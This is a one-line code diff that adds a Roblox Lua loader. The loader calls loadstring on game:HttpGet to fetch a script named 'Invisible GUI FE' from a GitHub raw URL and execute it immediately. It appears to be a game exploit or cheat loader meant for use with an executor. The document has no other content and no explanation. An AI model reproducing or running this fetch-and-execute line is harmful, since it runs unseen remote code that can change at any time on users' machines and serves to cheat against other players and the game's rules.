@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VladAndreiConstantin/Roblox-Scripts/main/Invisible%20GUI%20FE"))()
